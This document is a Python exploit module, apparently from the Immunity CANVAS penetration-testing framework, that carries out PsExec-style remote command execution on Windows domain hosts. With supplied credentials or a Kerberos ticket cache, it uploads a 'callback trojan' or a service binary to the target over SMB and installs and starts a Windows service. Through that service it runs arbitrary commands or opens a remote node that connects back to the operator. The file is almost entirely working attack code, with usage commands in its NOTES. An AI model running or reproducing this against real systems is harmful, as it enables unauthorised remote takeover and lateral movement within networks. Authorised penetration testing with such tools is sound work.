#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  psexec.py
## Description:
##            :
## Created_On :  Wed Feb 25 CET 2015
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import sys
import socket
import os
import time
import struct
import random
import cStringIO
import select
import logging
from datetime import datetime

if '.' not in sys.path:
    sys.path.append('.')

NAME                            = 'PsExec - Remote command execution'
DESCRIPTION                     = 'Executes a remote command on a Windows host of the domain.'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Microsoft'
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['Repeatability']  = ''

VERSION                         = '1.0'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Commands'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']                = [['Windows']]
PROPERTY['VERSION']             = ['NT', '2000', 'XP', 'Vista', '7', '2003', '2008']

CHANGELOG = """
"""

NOTES = """

Tested against:
    - Windows Server 2003 R2 (x86)
    - Windows Server 2008 R2 (amd64)
    - Windows 7 Ultimate N (x86)

Note:
    We only support servers and workstations part of a domain.

To get a node:
./commandlineInterface.py -v 17 -p 5555
python ./exploits/command/windows/psexec/psexec.py -t 192.168.0.1 -l 192.168.0.11 -d 5555 -Ouser:$user -Opassword:$pass

To execute a command:
python ./exploits/command/windows/psexec/psexec.py -t 192.168.0.1 -l 192.168.0.11 -d 5555 -Ouser:$user -Opassword:$pass -Ocmd:ipconfig
"""

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from engine import CanvasConfig
from engine.config import canvas_root_directory
from libs.canvasos import *
from libs.kerberos.filetimes import dt_to_filetime, utc
from libs.newsmb.libsmb import SMBSessionSetupException
import libs.newsmb.libsmb as libsmb
import libs.newsmb.smbconst as smbconst
import libs.newsmb.svcctl as svcctl
import libs.kerberos.ccache as cc

try:
    from pyasn1.codec.ber import encoder, decoder
except ImportError:
    logging.error("psexec: Cannot import pyasn1 (required)")
    raise

targets = {
    0: ['Autoversioning', 0],
    1: ['Windows ALL', 0]
}

WSAEWOULDBLOCK = 0x2733
CTRL_PIPE_NAME = '\\PsExecSvc_v1'

###
# Our exploit class
###

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name             = NAME
        self.port             = 445
        self.version          = 0
        self.covertness       = 0
        self.user             = ''
        self.password         = ''
        self.domain           = ''
        self.needsNoShellcode = 1
        self.magic_cookie     = '\xbe'+'\x00'*3
        self.ARCH             = "X86"
        self.is_64            = False
        self.sharename        = u"ADMIN$"
        self.local_path       = os.path.abspath(os.path.join(os.path.dirname(__file__), "tmp/"))
        self.cmd              = 'mosdef'
        self.local_service_32 = "backdoors/win-simple-service-32.exe"
        self.local_service_64 = "backdoors/win-simple-service-64.exe"
        self.ccache_file      = None
        self.use_kerberos     = False
        self.local_upl        = None
        self.remote_path_upl  = 'C:\\Windows\\Temp'
        self.DEBUG_MODE       = False
        self.timeout          = 3

        if not os.path.exists(self.local_path):
            os.makedirs(self.local_path)

        self.debug_errors     = False
        self.debug_tmp        = False

    def clean_tmp(self):
        if not self.debug_tmp:
            if self.local_callback and os.path.exists(self.local_callback):
                os.remove(self.local_callback)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getArgs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        self.version = int(self.argsDict.get('version', self.version))
        self.user = self.argsDict.get('user', self.user)
        self.password = self.argsDict.get('password', self.password)
        self.domain = self.argsDict.get('domain', self.domain)
        self.ccache_file = self.argsDict.get('krb5_ccache', self.ccache_file)
        self.local_upl = self.argsDict.get('local_upl', self.local_upl)
        self.remote_path_upl = self.argsDict.get('remote_path_upl', self.remote_path_upl)
        self.ARCH = self.argsDict.get('arch', self.ARCH)
        self.cmd = self.argsDict.get('cmd', self.cmd)
        self.debug_errors = self.argsDict.get('debug_errors', self.debug_errors)

        # Complete the attributes now that we know the value of cmd.
        randint                   = random.randint(0, 5000)
        if self.cmd == 'mosdef':
            self.service_name     = 'mosdefCB%4.4d' % randint
            self.callback_name    = 'CB%4.4d.EXE' % randint
            self.local_callback   = os.path.join(self.local_path, self.callback_name)
            self.remote_callback  = "\\%s" % self.callback_name
            self.remote_service   = "\\%s.exe" % self.service_name
        else:
            self.service_name     = 'mosdefSVC%4.4d' % randint
            self.callback_name    = None
            self.local_callback   = None
            self.remote_callback  = None
            self.local_service    = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/", "winsvc.exe"))
            self.remote_service   = "\\%s.exe" % self.service_name

        if self.debug_errors:
            logger = logging.getLogger()
            logger.setLevel(logging.DEBUG)

        return


    def check_file_to_upload(self):
        try:
            f = open(self.local_upl, 'rb')
            s = f.read()
            if not s:
                return False
            f.close()
        except Exception as e:
            if self.debug_errors:
                logging.debug('check_file_to_upload() failed: %s' % str(e))
            return False
        else:
            return True

    def check_ccache_file(self):
        """
        Quickly check the validity of the ccache file.
        This is mostly to avoid users incorrectly using the module.
        """
        try:
            # Can we open the credential file?
            cc1 = cc.CCache()
            cc1.open(self.ccache_file, new=0)

            # Is the DB related to the username?
            principal = cc1.get_primary_principal()
            user_domain = '@'.join([self.user,self.domain]).lower()
            if user_domain != principal.lower():
                return False

            # Do we have credential information that is not only configuration?
            creds = cc1.get_credentials()
            found_valid_creds = 0
            for cred in creds:
                if not cred.is_config_credential():
                    found_valid_creds = 1
            if not found_valid_creds:
                return False
            else:
                return True
        except Exception as e:
            if self.debug_errors:
                logging.debug('check_ccache_file() failed: %s' % str(e))
            return False
        else:
            return True

    def smb_check_credentials(self):
        """
        Check the validity of the credentials using SMB.
        """
        try:
            sockaddr = (self.host, self.port)
            s = socket.socket()
            s.settimeout(self.timeout)
            s.connect(sockaddr)
            if self.use_kerberos:
                smb = libsmb.SMBClient(s, self.user, self.password, self.domain, kerberos_db=self.ccache_file, use_krb5=True)
            else:
                smb = libsmb.SMBClient(s, self.user, self.password, self.domain)
            smb.is_unicode = True
            smb.negotiate()
            smb.session_setup()
            smb.logoff()
        except Exception as e:
            if self.debug_errors:
                logging.debug('smb_check_credentials() failed: %s' % str(e))
            return False
        else:
            return True

    def smb_upload_file(self, localpath, remotepath):
        """
        Upload a file using SMB.
        """
        try:
            sockaddr = (self.host, self.port)
            s = socket.socket()
            s.settimeout(self.timeout)
            s.connect(sockaddr)
            if self.use_kerberos:
                smb = libsmb.SMBClient(s, self.user, self.password, self.domain, kerberos_db=self.ccache_file, use_krb5=True)
            else:
                smb = libsmb.SMBClient(s, self.user, self.password, self.domain)
            smb.is_unicode = True
            #smb.max_smbfrag = 1

            smb.negotiate()
            try:
                smb.session_setup()
            except SMBSessionSetupException as e:
                if e.status == STATUS_ACCESS_DENIED:
                    logging.error('SMB: Authentication failed.')
                else:
                    logging.error("SMB_ERROR: %s" % e.message)
                return False

            smb.tree_connect(self.sharename)
            logging.info('Uploading %s in %s' % (localpath,remotepath))
            f = file(localpath, 'rb')
            smb.put(f, u'%s' % remotepath)
            f.close()

            # Bye
            smb.tree_disconnect()
            smb.logoff()
        except Exception as e:
            if self.debug_errors:
                logging.debug('smb_upload_file() failed: %s' % str(e))
            logging.error("Error during smb upload")
            return False

        return True

    def create_callback(self, arch):
        """
        Build the MOSDEF callback trojan. On x64 capabable
        systems we use the x64 callback.
        """
        if not self.callback:
            logging.error('No callback set')
            return False
        try:
            t_os = canvasos('Windows')
            t_os.arch = arch
            try:
                ret = self.buildmosdeftrojan(self.callback.ip,
                                             self.callback.port,
                                             target_os=t_os,
                                             universal=True,
                                             encrypted=True)
            except Exception as e:
                logging.error("Error while building MOSDEF callback: %s" % (str(e)))
                logging.info("%s - failed" % (NAME))
                return False

            # write out the binary
            src = self.local_callback
            logging.info('Writing callback trojan in %s' % src)
            fd = open(src, 'wb')
            fd.write(self.mosdeftrojan)
            fd.close()
        except Exception as e:
            if self.debug_errors:
                logging.debug('create_callback() failed: %s' % str(e))
            logging.error("An errorr occurred while creating mosdef callback")
            return False

        return True

    def create_and_start_service(self):
        try:
            self.mySVC = svcctl.SVCCTLClient(self.host)
            if self.use_kerberos:
                self.mySVC.set_credentials(username=self.user, password=self.password, domain=self.domain, kerberos_db=self.ccache_file, use_krb5=True)
            else:
                self.mySVC.set_credentials(username=self.user, password=self.password, domain=self.domain)
            if not self.mySVC.bind():
                logging.error("Unable to connect to the RPC interface: bind failed.")
                return False
        except Exception as e:
            if self.debug_errors:
                logging.debug('create_and_start_service() failed: %s' % str(e))
            logging.error("Unable to connect to the RPC interface: %s" % str(e))
            return False

        logging.info("Adding service %s stored in %s" % (self.service_name, self.remote_service))
        self.setProgress(80)

        try:
            handle = self.mySVC.open_manager()
            self.mySVC.create_service(handle=handle,
                                      service_name=self.service_name,
                                      binary_pathname='%SYSTEMROOT%\\' + self.remote_service,
                                      display_name=self.service_name,
                                      start_type=svcctl.SVCCTL_SERVICE_AUTO_START)
        except Exception as e:
            if self.debug_errors:
                logging.debug('create_and_start_service() failed: %s' % str(e))
            logging.error('Failed to create the \'%s\' service: %s' % (self.service_name, str(e)))
            return False
        else:
            logging.info("Service %s has been created successfully" % self.service_name)

        self.setProgress(90)
        try:
            service_handle = self.mySVC.open_service(self.service_name)
        except Exception as e:
            if self.debug_errors:
                logging.debug('create_and_start_service() failed: %s' % str(e))
            logging.error("The service could not be open")
            return False

        try:
            # Starting the service
            self.mySVC.start_service(service_handle, args=['C:\\Windows\\%s' % self.callback_name])

        except Exception as e:
            logging.error("The service could not be started")
            logging.error(str(e))
            return False

        # Closing everything
        self.mySVC.close_service(service_handle)
        self.mySVC.close_manager()
        return True

    def stop_and_delete_service(self):

        try:
            self.mySVC = svcctl.SVCCTLClient(self.host)
            if self.use_kerberos:
                self.mySVC.set_credentials(username=self.user, password=self.password, domain=self.domain, kerberos_db=self.ccache_file, use_krb5=True)
            else:
                self.mySVC.set_credentials(username=self.user, password=self.password, domain=self.domain)
            self.mySVC.bind()
        except Exception as e:
            if self.debug_errors:
                logging.debug('stop_and_delete_service() failed: %s' % str(e))
            logging.error("Unable to (re)connect to the RPC interface: %s" % str(e))
            return False

        logging.info("Stopping service %s stored in %s" % (self.service_name, self.remote_service))

        try:
            service_handle = self.mySVC.open_service(self.service_name)
            self.mySVC.stop_service(service_handle)
            # We allow up to 5s for the service to stop
            logging.info('Sleeping for %ds' % self.timeout)
            for i in xrange(0,self.timeout,1):
                ret = self.mySVC.query_service(service_handle)
                if ret['CurrentState'] == svcctl.SVCCTL_SERVICE_STOPPED:
                    break
                time.sleep(1)
        except Exception as e:
            if self.debug_errors:
                logging.debug('stop_and_delete_service() failed: %s' % str(e))
            logging.error('Failed to stop the \'%s\' service: %s' % (self.service_name, str(e)))
        else:
            logging.info("Service %s has been stopped successfully" % self.service_name)

        # Whether we were successfull or not in stopping the service, we delete it
        logging.info("Deleting service %s stored in %s" % (self.service_name, self.remote_service))

        try:
            service_handle = self.mySVC.delete_service(service_name=self.service_name)
            self.mySVC.close_service(service_handle)
        except Exception as e:
            logging.error('Failed to delete the \'%s\' service: %s' % (self.service_name, str(e)))
            logging.error(str(e))
            return False
        else:
            logging.info("Service %s has been deleted successfully" % self.service_name)
        return True

    def is_alive_with_smb(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host,self.port))
            s.close()
            return True
        except Exception as e:
            return False

    def test(self):
        self.getArgs()
        if self.is_alive_with_smb():
            return 1
        return 0

    def testOS(self, target_ip):
        isWindows = True

        logging.info('Attempting to fingerprint %s' % target_ip)
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        app.target.interface = target_ip
        app.argsDict["smb"]                 = True
        app.argsDict["http"]                = False # not needed
        app.argsDict["ssh"]                 = False # not needed
        app.argsDict["mdns"]                = False # not needed
        app.argsDict["ntp"]                 = False # not needed
        app.argsDict["ftp"]                 = False # not needed
        app.argsDict["smtp"]                = False # not needed
        app.argsDict["dtspcd"]              = False # not needed
        app.argsDict["ipfi"]                = False # not needed
        app.argsDict["telnet"]              = False # not needed
        app.argsDict["nolanguagedetect"]    = True  # not needed

        if app.run() == 0:
            logging.info('Automatic detection failed')
            return None

        myos = app.result

        # Detection of the OS is straightforward
        if myos.base != 'Windows':
            logging.info("A non-Windows host has been detected")
            isWindows = False

        return isWindows

    # http://stackoverflow.com/questions/2257441/random-string-generation-with-upper-case-letters-and-digits-in-python
    def get_random_alphanum_string(self, N):
        return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(N))

    # This methods creates the control payload used to communicate with the
    # Windows service.
    def build_initial_payload(self, cmd, version=1, tmp_binary_path=None, final_binary_path=None):

        self.stdin_rand_str = self.get_random_alphanum_string(16)
        self.stdout_rand_str = self.get_random_alphanum_string(16)
        self.stderr_rand_str = self.get_random_alphanum_string(16)

        # 4 bytes: random int
        ctrlbuffer = struct.pack('<L', 3704) # TODO: random

        # 3*32 = 96 next bytes are the random strings
        ctrlbuffer += self.stdin_rand_str.encode('UTF-16LE')
        ctrlbuffer += self.stdout_rand_str.encode('UTF-16LE')
        ctrlbuffer += self.stderr_rand_str.encode('UTF-16LE')

        # Then up to 4096 bytes we have the command line.
        # For this first version this should be more than enough.
        ctrlbuffer += cmd
        ctrlbuffer += '\x00'* (4096 - len(ctrlbuffer))

        # Additional paths are added starting with protocol v2
        if version >= 2:
            if not tmp_binary_path:
                tmp_binary_path  = ''
            tmp_binary_path = tmp_binary_path.encode('UTF-16LE')
            tmp_binary_path += '\x00'* (512 - len(tmp_binary_path))
            if not final_binary_path:
                final_binary_path = ''
            final_binary_path = final_binary_path.encode('UTF-16LE')
            final_binary_path += '\x00'* (512 - len(final_binary_path))
            ctrlbuffer += tmp_binary_path + final_binary_path

        return ctrlbuffer

    # This methods open a specific pipe.
    def open_pipe_and_wait(self, smb, pipe_name, access, with_wait=1):
        try:
            if with_wait:
                smb.transact_wait(name='\\PIPE' + pipe_name)
            smb.nt_create(name = pipe_name, desired_access=access)
        except libsmb.SMBNTCreateException as e:
            if self.debug_errors:
                logging.debug('open_pipe_and_wait() failed: %s' % str(e))
            logging.error('SMB_ERROR while opening pipe %s: %s' % (pipe_name, str(e)))
            return None
        except libsmb.SMBTransactException as e:
            if self.debug_errors:
                logging.debug('open_pipe_and_wait() failed: %s' % str(e))
            logging.error('SMB_ERROR while opening pipe %s: %s' % (pipe_name, str(e)))
            return None
        except Exception as e:
            if self.debug_errors:
                logging.debug('open_pipe_and_wait() failed: %s' % str(e))
            logging.error('SMB_ERROR: %s' % str(e))
            return None
        else:
            return smb.get_fid()

    def prepare_cmd(self, cmd):
        l = cmd.split()
        cmd_str = ('\"%s\" %s' % (l[0],' '.join(l[1:]))).encode('UTF-16LE')
        return cmd_str

    def execute_single_cmd(self, cmd, proto_version, tmp_binary_path=None, final_binary_path=None):
        """
        Execute the command line passed as an argument on the server.
        This assumes that the corresponding Windows server was started before.
        """
        try:
            sockaddr = (self.host, self.port)
            s = socket.socket()
            s.settimeout(self.timeout)
            s.connect(sockaddr)
            if self.use_kerberos:
                smb = libsmb.SMBClient(s, self.user, self.password, self.domain, kerberos_db=self.ccache_file, use_krb5=True)
            else:
                smb = libsmb.SMBClient(s, self.user, self.password, self.domain)
            smb.is_unicode = True
            #smb.max_smbfrag = 1

            smb.negotiate()
            try:
                smb.session_setup()
            except libsmb.SMBSessionSetupException as e:
                logging.error("SMB_ERROR: %s" % e)
                return False

            smb.tree_connect("IPC$")
            logging.info("Connecting to \\%s" % self.service_name)

            main_fid = self.open_pipe_and_wait(smb, CTRL_PIPE_NAME, 0x2019f, with_wait=0)
            if not main_fid:
                return False
            else:
                logging.info("Got the FID %d for main named pipe" % main_fid)

            try:
                data = smb.transact_np(self.magic_cookie)
            except libsmb.SMBTransactException as e:
                logging.error('SMB_ERROR: %s' % e.message)
                return False
            else:
                if data != self.magic_cookie:
                    logging.error('Protocol error between the client and the service')
                    return False

            ctrlbuffer = self.build_initial_payload(cmd, version=proto_version, tmp_binary_path=tmp_binary_path, final_binary_path=final_binary_path)

            stdin_pipe_name  = '\\' + self.stdin_rand_str +'-stdin'
            stdout_pipe_name = '\\' + self.stdout_rand_str +'-stdout'
            stderr_pipe_name = '\\' + self.stderr_rand_str +'-stderr'

            # Send the control buffer over the wire.
            f = cStringIO.StringIO()
            f.write(ctrlbuffer)
            smb.write(f)
            f.close()

            # Wait a bit to be sure everything is allright.
            time.sleep(0.1)

            # The current API by design, does not handle more than one FID per
            # instance. But we can cheat by saving/restoring the FID.
            # We create all the required pipes, each time saving the FID.

            stdin_fid = self.open_pipe_and_wait(smb,stdin_pipe_name,0x20196)
            if not stdin_fid:
                return False

            stdout_fid = self.open_pipe_and_wait(smb,stdout_pipe_name,0x20089)
            if not stdout_fid:
                return False

            stderr_fid = self.open_pipe_and_wait(smb,stderr_pipe_name,0x20089)
            if not stderr_fid:
                return False

            # A short wait.
            time.sleep(0.1)

            # At this point it is necessary to have the socket non blocking.
            # Because basically we'll keep polling.
            smb.set_socket_asynchronous()

            do_break_stdout = 0
            do_break_stderr = 0
            stdout_block_counter = 0
            stderr_block_counter = 0

            while 1:

                time.sleep(0.1)

                # stdout polling
                f = cStringIO.StringIO()
                try:
                    smb.set_fid(stdout_fid)
                    smb.read(f)
                    stdout_block_counter = 0
                except libsmb.SMBReadException as e:
                    if e.status == smbconst.STATUS_PIPE_DISCONNECTED:
                        # normal situation
                        do_break_stdout=1
                    # If there is nothing to read, the API raises a STATUS_REQUEST_NOT_ACCEPTED
                    # error corresponding to the WSAEWOULDBLOCK errno.
                    elif e.status == smbconst.STATUS_REQUEST_NOT_ACCEPTED:
                        # normal situation
                        pass
                    # or it might raise a WSAEWOULDBLOCK
                    elif e.status == WSAEWOULDBLOCK:
                        # normal situation but we need to avoid infinite loops
                        stdout_block_counter += 1
                        if stdout_block_counter > 10*self.timeout:
                            break
                        else:
                            pass
                    else:
                        logging.error('Unexpected error on the stdout pipe: %s' % str(e))
                        return False
                else:
                    s = f.getvalue()
                    logging.info(s.replace('\r\n', '\n'))
                f.close()

                # stderr polling
                f = cStringIO.StringIO()
                try:
                    smb.set_fid(stderr_fid)
                    smb.read(f)
                    stderr_block_counter = 0
                except libsmb.SMBReadException as e:
                    if e.status == smbconst.STATUS_PIPE_DISCONNECTED:
                        # normal situation
                        do_break_stderr=1
                    # If there is nothing to read, the API raises a STATUS_REQUEST_NOT_ACCEPTED
                    # error corresponding to the WSAEWOULDBLOCK errno.
                    elif e.status == smbconst.STATUS_REQUEST_NOT_ACCEPTED:
                        # normal situation
                        pass
                    # or it might raise a WSAEWOULDBLOCK
                    elif e.status == WSAEWOULDBLOCK:
                        # normal situation but we need to avoid infinite loops
                        do_break_stderr=1
                        if stderr_block_counter > 10*self.timeout:
                            break
                        else:
                            pass
                    else:
                        logging.error('Unexpected error on the stderr pipe: %s' % str(e))
                        return False
                else:
                    s = f.getvalue()
                    logging.info(s.replace('\r\n', '\n'))
                f.close()

                if do_break_stdout and do_break_stderr:
                    break

        except Exception as e:
            if self.debug_errors:
                logging.debug('open_pipe_and_wait() failed: %s' % str(e))
            logging.error('Error could not execute %s' % cmd)
            return False

        else:
            return True


    def run(self):

        self.getArgs()

        # Sanity check: ARCH
        if self.ARCH == 0:
            self.ARCH = "X86"
        if self.ARCH == 1:
            self.ARCH = "x64"

        if self.ARCH not in ["X86", "x64"]:
            logging.error("Incorrect architecture was specified on the CLI: %s" % self.ARCH)
            return 0

        # Sanity check: the ccache credentials
        if self.ccache_file:
            if not self.check_ccache_file():
                logging.error('%s doesn\'t seem to be a valid ccache file for user %s' % (self.ccache_file, '@'.join([self.user,self.domain])))
                self.clean_tmp()
                return 0
            else:
                self.use_kerberos = True

        # Sanity check: the file to upload
        if self.local_upl:
            if not self.check_file_to_upload():
                logging.error('%s doesn\'t seem to be a valid file or you don\'t have the rights to read it' % (self.local_upl))
                self.clean_tmp()
                return 0

        # First of all, let's check that the target is alive. Since we will be
        # using tcp/445 for service upload/creation, a tcp connect is fair check.
        # Note: However we should also in another version consider the case of SMB over UDP.
        if not self.is_alive_with_smb():
            logging.info("Target doesn't have SMB exposed. Bailing")
            return 0

        # First of all do we even have the correct credentials?
        if not self.smb_check_credentials():
            logging.error('%s: Unable to login on %s:%d using %s@%s:%s' %
                ('NLTM' if not self.use_kerberos else 'KERBEROS',
                 self.host,
                 self.port,
                 self.user,
                 self.domain,
                 self.password if not self.use_kerberos else 'FILE(%s)' % self.ccache_file))

            # At this point if we failed to auth using kerberos, we consider it a global failure
            # but if we failed using NTLM, we can keep going trying using Kerberos.
            # Such a situation may occur when NTLM auth is refused for some accounts.

            if self.use_kerberos:
                self.clean_tmp()
                return 0

            logging.info('Trying to auth using Kerberos instead')
            self.use_kerberos = True
            self.ccache_file = None
            if not self.smb_check_credentials():
                logging.error('%s: Unable to login on %s:%d using %s@%s:%s' %
                    ('KERBEROS',
                     self.host,
                     self.port,
                     self.user,
                     self.domain,
                     self.password))
                self.clean_tmp()
                return 0

        logging.info('%s: Successful login using credentials %s:%s' %
                ('NLTM' if not self.use_kerberos else 'KERBEROS',
                 self.user,
                 self.password if not self.use_kerberos or not self.ccache_file else 'FILE(%s)' % self.ccache_file))

        # By default, the architecture is X86 but we may force X64 if required.
        if self.ARCH == 'x64':
            self.is_64 = True

        # If automatic was selected, we need to know if the remote host is windows
        # We may also need to run the test nonetheless if we need the architecture
        # Note: Obviously we could also own unix target integrated in the AD but
        # we won't support this case.
        if self.version == 0:
            logging.info("Fingerprinting our target")
            self.isWindows = self.testOS(self.host)
            if self.isWindows == None:
                logging.info("OS detection failed. You may rerun the exploit forcing Windows")
                return 0
            else:
                if self.isWindows == False:
                    logging.error('Not a Windows target. Aborting')
                    return 0

        # OK let's start
        logging.info('%s attacking %s:%d - (in progress)' % (self.name, self.host, self.port))
        self.setProgress(40)

        # If the user didn't requested a specific command, we need to push the
        # callback.
        if self.cmd == 'mosdef':
            # We build the mosdef callback
            self.setProgress(50)
            if not self.create_callback(self.ARCH.upper()):
                logging.error('Creation of the callback failed')
                self.clean_tmp()
                return 0

            # We upload it on the target's samba share ADMIN$.
            # TODO: Be able to upload it on other shares as well.
            self.setProgress(60)

            logging.info("Uploading callback binary")
            if not self.smb_upload_file(self.local_callback, self.remote_callback):
                logging.error('Uploading of the callback failed')
                self.clean_tmp()
                return 0

            logging.info("Callback uploaded successfully")

            if self.is_64:
                logging.info("Uploading 64bit service binary")
                self.local_service = self.local_service_64
            else:
                logging.info("Uploading 32bit service binary")
                self.local_service = self.local_service_32
        else:
            self.setProgress(60)
            logging.info("Uploading %s service binary" % self.local_service)

        # Now we can focus on the service itself.
        if not self.DEBUG_MODE:
            if not self.smb_upload_file(self.local_service, self.remote_service):
                logging.error('Uploading of the service failed')
                self.clean_tmp()
                return 0

        logging.info("Service binary uploaded successfully")

        ## We use the SVCCTL interface over SMB to start a service running
        ## the callback
        self.setProgress(70)
        if not self.DEBUG_MODE:
            logging.info("Executing service")
            if not self.create_and_start_service():
                logging.error('Service start failed')
                self.clean_tmp()
                return 0
            else:
                logging.info("Service started successfully")

        # At this point either the Windows executed the callback or it is waiting
        # for our instructions (ie: which command should it execute?).

        if self.cmd != 'mosdef':

            if self.local_upl:

                # sanitize the remote directory path
                if self.remote_path_upl[-1] != '\\':
                    self.remote_path_upl += '\\'
                # deduce from the command line what will be the name of the file
                # once written on disk
                binary_name = self.cmd.split()[0]
                if len(binary_name) < 4 or binary_name[-4:].lower() != '.exe':
                    binary_name += '.exe'

                upload_src_remote_path = "\\%s" % binary_name
                upload_dst_remote_path = self.remote_path_upl + binary_name

                # We use SMB to upload the file as it's easier
                logging.info('Uploading the file %s to %s:%s' % (self.local_upl,self.host, upload_dst_remote_path))
                if not self.smb_upload_file(self.local_upl, upload_src_remote_path):
                    logging.error('Uploading of the service failed')
                    self.clean_tmp()
                    return 0

                logging.info('Binary successfully pushed')
                cmd_str = " " + " ".join(self.cmd.split()[1:])
                cmd_str = cmd_str.encode('UTF-16LE')

                # This requires proto >= 2
                proto_version=2
                tmp_binary_path='C:\\Windows\\' + binary_name
                final_binary_path=upload_dst_remote_path
                self.magic_cookie = '\xbf'+'\x00'*3

            else:
                cmd_str = self.prepare_cmd(self.cmd)
                proto_version=1
                tmp_binary_path=None
                final_binary_path=None


            logging.info("Executing the command")
            if not self.execute_single_cmd(cmd_str, proto_version, tmp_binary_path=tmp_binary_path, final_binary_path=final_binary_path):
                logging.error('The command execution failed')
            else:
                logging.info('%s attacking %s:%d (succeeded!)' % (self.name, self.host, self.port))
                logging.info('%s done (Success!)' % (self.name))

            # Whether we executed a command or not, we must stop the service
            # and delete it.

            if not self.DEBUG_MODE:
                if not self.stop_and_delete_service():
                    logging.error('Service deletetion failed')
                    self.clean_tmp()
                    return 0
                else:
                    self.clean_tmp()
                    return 1

        # If we are here, it means that we are trying to retrieve a node.
        else:

            # Whether we had a shell or executed a command, we must stop the service
            # and delete it.

            if not self.stop_and_delete_service():
                logging.error('Service deletetion failed')

            # Did we succeed?
            self.setProgress(100)
            sleeptime = 10
            logging.info('Sleeping for %ds' % sleeptime)
            for i in xrange(0,sleeptime,2):
                if self.state == self.HALT:
                    logging.info("Halted")
                    break
                logging.info("Slept: %d" % i)
                if self.ISucceeded():
                    # logging.info("Success!")
                    break
                time.sleep(2)

            if self.ISucceeded():
                logging.info('%s attacking %s:%d (succeeded!)' % (self.name, self.host, self.port))
                logging.info('%s done (Success!)' % (self.name))
                self.clean_tmp()
                return 1

            logging.info('%s attacking %s:%d (failed)' % (self.name, self.host, self.port))
            logging.error('%s done (failed)' % (self.name))
            self.clean_tmp()
            return 0


if __name__=='__main__':
    logging.info('Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION))
    app = theexploit()
    try:
        ret = standard_callback_commandline(app)
    except KeyboardInterrupt:
        pass
    if ret not in [0,1,None] and hasattr(ret, 'interact'):
        ret.interact()
